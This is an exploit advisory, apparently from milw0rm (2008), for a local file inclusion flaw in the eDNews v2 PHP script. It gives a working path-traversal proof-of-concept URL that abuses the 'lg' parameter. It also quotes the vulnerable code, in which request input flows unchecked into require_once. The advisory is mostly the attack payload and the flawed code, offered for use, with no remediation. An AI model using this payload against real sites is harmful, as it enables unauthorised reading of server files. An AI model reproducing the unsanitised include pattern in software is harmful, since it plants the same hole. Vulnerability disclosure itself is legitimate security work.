@@ -1,0 +1,30 @@
+ _____   ____   __   __     _       ____        ____    ____ 
+|_   _| |  _ \  \ \ / /    / \     / ___|      / ___|  / ___|
+  | |   | |_) |  \ V /    / _ \   | |  _      | |     | |    
+  | |   |  _ <    | |    / ___ \  | |_| |  _  | |___  | |___ 
+  |_|   |_| \_\   |_|   /_/   \_\  \____| (_)  \____|  \____|
+
+
+
+eDNews v2 (lg) Local File Inclusion Vulnerability
+Script : http://www.mirrorservice.org/sites/download.sourceforge.net/pub/sourceforge/e/ed/edscontacts/eDNews_v2.zip
+Poc : /eDNews_archive.php?lg=../../../../index
+Vuln Code :
+File eDNews_archive.php
+
+require_once dirname( __FILE__ ).'/myConfig.php';<< 1
+require_once dirname( __FILE__ ).'/languages/'.$CONFIG['language'].'.php'; << 2
+
+File myConfig.php
+
+if ( isset( $_REQUEST['lg'] ) ) { 
+    $CONFIG['language'] = $_REQUEST['lg']; 
+
+        ____           _           _           __  __ 
+       / ___|   ___   | |       __| |         |  \/  |
+      | |  _   / _ \  | |      / _` |         | |\/| |
+      | |_| | | (_) | | |___  | (_| |         | |  | |
+       \____|  \___/  |_____|  \__,_|  _____  |_|  |_|
+                                      |_____|         
+
+# milw0rm.com [2008-12-29]
